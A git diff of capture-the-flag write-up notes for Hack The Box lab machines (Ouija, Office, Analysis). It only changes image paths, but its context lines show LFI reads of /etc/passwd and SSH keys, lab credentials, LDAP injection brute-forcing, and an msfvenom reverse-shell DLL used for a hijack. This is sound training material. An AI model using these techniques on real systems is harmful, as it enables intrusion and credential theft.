@@ -137,16 +137,16 @@ $y$j9T$Kg/bsxGg3rtmr7d.HkQ0N/$14XejevAukcx9oDmYsXF967olH7um9buAQ3wSGdOCy8
 
     * Apache2 Default Page
 
-    <figure><img src=".gitbook/assets/image (74).png" alt=""><figcaption></figcaption></figure>
+    <figure><img src="../.gitbook/assets/image (74).png" alt=""><figcaption></figcaption></figure>
 
 
 *   port 3000
 
     * 200 not found, redirect to .
 
-    <figure><img src=".gitbook/assets/image (75).png" alt=""><figcaption></figcaption></figure>
+    <figure><img src="../.gitbook/assets/image (75).png" alt=""><figcaption></figcaption></figure>
 
-    <figure><img src=".gitbook/assets/image (76).png" alt=""><figcaption></figcaption></figure>
+    <figure><img src="../.gitbook/assets/image (76).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -157,11 +157,11 @@ $y$j9T$Kg/bsxGg3rtmr7d.HkQ0N/$14XejevAukcx9oDmYsXF967olH7um9buAQ3wSGdOCy8
     * add to hosts
       * `sudo nano /etc/hosts`
 
-<figure><img src=".gitbook/assets/image (77).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (77).png" alt=""><figcaption></figcaption></figure>
 
 * we accessed the website
 
-<figure><img src=".gitbook/assets/image (78).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (78).png" alt=""><figcaption></figcaption></figure>
 
 *   lets dir bust ouija.htb website...
 
@@ -169,7 +169,7 @@ $y$j9T$Kg/bsxGg3rtmr7d.HkQ0N/$14XejevAukcx9oDmYsXF967olH7um9buAQ3wSGdOCy8
       * /admin
       * /css /img /js /lib
 
-    <figure><img src=".gitbook/assets/image (79).png" alt=""><figcaption></figcaption></figure>
+    <figure><img src="../.gitbook/assets/image (79).png" alt=""><figcaption></figcaption></figure>
 
 
 * access to subpages
@@ -189,17 +189,17 @@ $y$j9T$Kg/bsxGg3rtmr7d.HkQ0N/$14XejevAukcx9oDmYsXF967olH7um9buAQ3wSGdOCy8
   * tracking script -> gitea.ouija.htb/leila/....
     * `src="`**`http://gitea.ouija.htb/leila/ouija-htb/js/tracking.js?_=0183747482`**`"`
 
-<figure><img src=".gitbook/assets/image (80).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (80).png" alt=""><figcaption></figcaption></figure>
 
 ### Weaponisation
 
 * add gitea.ouija.htb to hosts...
 
-<figure><img src=".gitbook/assets/image (81).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (81).png" alt=""><figcaption></figcaption></figure>
 
 * access gitea repo
 
-<figure><img src=".gitbook/assets/image (82).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (82).png" alt=""><figcaption></figcaption></figure>
 
 * `git clone http://gitea.ouija.htb/leila/ouija-htb.git`
   * instructions:
@@ -208,7 +208,7 @@ $y$j9T$Kg/bsxGg3rtmr7d.HkQ0N/$14XejevAukcx9oDmYsXF967olH7um9buAQ3wSGdOCy8
         * [CVE-2023-25725](https://www.cvedetails.com/cve/CVE-2023-25725/)
           * we can bypass access control because HTTP/1 headers are inadvertently lost in some situations (request smuggling)
 
-<figure><img src=".gitbook/assets/image (84).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (84).png" alt=""><figcaption></figcaption></figure>
 
 * PoCs
   * alexOarga/CVE-2021-40346: CVE-2021-40346 - HaProxy HTTP request smuggling through integer overflow\
@@ -224,26 +224,26 @@ $y$j9T$Kg/bsxGg3rtmr7d.HkQ0N/$14XejevAukcx9oDmYsXF967olH7um9buAQ3wSGdOCy8
 
 #### Content
 
-<figure><img src=".gitbook/assets/image (85).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (85).png" alt=""><figcaption></figcaption></figure>
 
 * init.sh
   * beginning of api config... (Front Jailor 3000 End)
     *
 
-        <figure><img src=".gitbook/assets/image (86).png" alt=""><figcaption></figcaption></figure>
+        <figure><img src="../.gitbook/assets/image (86).png" alt=""><figcaption></figcaption></figure>
 
 
 * app.js
   * sub-base 64+16 ... identification header, sha256, ihash header...
     *
 
-        <figure><img src=".gitbook/assets/image (87).png" alt=""><figcaption></figcaption></figure>
+        <figure><img src="../.gitbook/assets/image (87).png" alt=""><figcaption></figcaption></figure>
 
 
 
 #### LFI 1
 
-<figure><img src=".gitbook/assets/image (88).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (88).png" alt=""><figcaption></figcaption></figure>
 
 * crafted python script for that...
   * lfi.py
@@ -300,7 +300,7 @@ print (output)
 * output
   *
 
-      <figure><img src=".gitbook/assets/image (89).png" alt=""><figcaption></figcaption></figure>
+      <figure><img src="../.gitbook/assets/image (89).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -320,12 +320,12 @@ print (output)
 
 #### LFI 2
 
-<figure><img src=".gitbook/assets/image (90).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (90).png" alt=""><figcaption></figcaption></figure>
 
 * .config/bin/process\_informations/self/root/etc/passwd&#x20;
 * .config/bin/process\_informations/self/root/home/leila/.ssh/id\_rsa
 
-<figure><img src=".gitbook/assets/image (91).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (91).png" alt=""><figcaption></figcaption></figure>
 
 * **obtained ir\_rsa of user leila**
   * path of injection: ......./home/leila/.ssh/id\_rsa
@@ -380,7 +380,7 @@ print (output)
 
 `sudo nmap -sVC 10.10.11.3`
 
-<figure><img src=".gitbook/assets/image (16) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (16) (1).png" alt=""><figcaption></figcaption></figure>
 
 * obtained info
   * 53 DNS
@@ -423,7 +423,7 @@ print (output)
       * name: joomla\_db
       * **root:H0lOgrams4reTakIng0Ver754!**
 
-<figure><img src=".gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * OK, we obtained access to DB, but first we have to gain backend access...
 
@@ -448,7 +448,7 @@ cd dist
     * dlanor@office.htb
     * dmichael@office.htb
 
-<figure><img src=".gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Exploitation
 
@@ -474,9 +474,9 @@ cd <folder>
 get GPT.INI
 ```
 
-<figure><img src=".gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src=".gitbook/assets/image (4) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -495,13 +495,13 @@ get GPT.INI
 
 * nothing much than the expected ones on Windows machine
 
-<figure><img src=".gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>
 
 #### website
 
 * page with no subpages, no text, no versions...
 
-<figure><img src=".gitbook/assets/image (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 #### fuzzing
 
@@ -510,18 +510,18 @@ get GPT.INI
 * did it one more time, found a subdomain
   * **internal**.analysis.htb
 
-<figure><img src=".gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 #### kerbrute
 
 * `./kerbrute_linux_amd64 userenum --dc analysis.htb -d analysis.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt`
 * some usernames found, could be useful for Weaponisation
 
-<figure><img src=".gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * `nano usernames.txt`
 
-<figure><img src=".gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (4) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Weaponisation
 
@@ -533,7 +533,7 @@ get GPT.INI
     * /dashboard
     * /employees
 
-<figure><img src=".gitbook/assets/image (2) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -541,7 +541,7 @@ get GPT.INI
   * /users
     * /list
 
-<figure><img src=".gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * /dashboard
   * /index
@@ -554,9 +554,9 @@ get GPT.INI
 * /employees
   * /login
 
-<figure><img src=".gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (5) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src=".gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 #### LDAP Injection
 
@@ -565,7 +565,7 @@ get GPT.INI
   * LDAP Injection is an attack used to exploit web based applications that construct LDAP statements based on user input. When an application fails to properly sanitize user input, it’s possible to modify LDAP statements using a local proxy. This could result in the execution of arbitrary commands such as granting permissions to unauthorized queries, and content modification inside the LDAP tree. The same advanced exploitation techniques available in [SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection) can be similarly applied in LDAP Injection.
 * [http://internal.analysis.htb/users/list.php?name=\*](http://internal.analysis.htb/users/list.php?name=*)
 
-<figure><img src=".gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>
 
 * OK, we obtained the username "technician"
   * lets obtain his PW to login
@@ -648,7 +648,7 @@ func main() {
 
 * interation goes into loop because of \* char
 
-<figure><img src=".gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>
 
 * lets add the obtained string to the script and do the second iteration
   * `baseURL := "http://internal.analysis.htb/users/list.php?name=`_`)(%26(objectClass=user)(description=97NTtl`_`{found_char}{FUZZ}*)"`
@@ -731,20 +731,20 @@ func main() {
 * it finds our PW
   * **`97NTtl*4QP96Bv`**
 
-<figure><img src=".gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>
 
 * Lets check if it is correct...
   * nano PW.txt
     * **`97NTtl*4QP96Bv`**
   * `./kerbrute_linux_amd64 bruteuser --dc analysis.htb -d analysis.htb PW.txt technician`
 
-<figure><img src=".gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>
 
 *   Login into
 
     * technician@analysis.htb:97NTtl\*4QP96Bv
 
-    <figure><img src=".gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>
+    <figure><img src="../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Exploitation
 
@@ -758,7 +758,7 @@ func main() {
 * Emergency
   * we can send data through notification form&#x20;
 
-<figure><img src=".gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
 
 #### Crafting php RS
 
@@ -767,7 +767,7 @@ func main() {
   * nano shell.php
     * upload it & go to /dashboard/uploads/shell.php
 
-<figure><img src=".gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
 
 * cd C:\inetpub\internal\users
 * type list.php
@@ -776,7 +776,7 @@ func main() {
     * $ldap\_username = 'webservice@analysis.htb';
     * $ldap\_connection = ldap\_connect("analysis.htb");
 
-<figure><img src=".gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
 
 * cd C:\inetpub\internal\employees
 * type login.php
@@ -786,7 +786,7 @@ func main() {
     * $password = '0$TBO7H8s12yh&';&#x20;
     * $database = "employees";
 
-<figure><img src=".gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>
 
 ### User flag
 
@@ -796,19 +796,19 @@ func main() {
 * `reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"`
   * **jdoe:7y4Z4^\*y9Zzj**
 
-<figure><img src=".gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>
 
 #### evil-winrm login
 
 * `evil-winrm -i 10.10.11.250 -u jdoe -p 7y4Z4^*y9Zzj`
 
-<figure><img src=".gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>
 
 * `cd ..`
 * `cd Desktop`
 * `type user.txt`
 
-<figure><img src=".gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>
 
 ### Root flag
 
@@ -821,18 +821,18 @@ func main() {
       * we can hijack it for PE
         * &#x20;reference: [https://hyp3rlinx.altervista.org/advisories/SNORT-DLL-HIJACK.txt](https://hyp3rlinx.altervista.org/advisories/SNORT-DLL-HIJACK.txt)
 
-<figure><img src=".gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>
 
 * `icacls snort_dynamicpreprocessor`
 
-<figure><img src=".gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>
 
 #### Create a malicious .dll file
 
 * `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=9001 -f dll -o sf_engine.dll`
   * we crafted malicious **sf\_engine.dll** file
 
-<figure><img src=".gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>
 
 * msfconsole -q
   * search multi handler
@@ -842,26 +842,26 @@ func main() {
   * set LPORT 9001
   * run -j
 
-<figure><img src=".gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>
 
 * Evil-winRM
   * cd snort\_dynamicpreprocessor
   * upload sf\_engine.dll
 
-<figure><img src=".gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>
 
 * The next step is to start snort, so I've create an empty pcap-file in C:\private this might raise an error but as long the file exists it is fine. Could be possible to start snort without a file as well
   * cd private
   * type nul > test.pcap
 
-<figure><img src=".gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>
 
 * now we should obtain the ADMIN shell in our msfconsole
   * shell
     * `cd Users/Administrator/Desktop`
     * `type root.txt`
 
-<figure><img src=".gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Freelancer
 
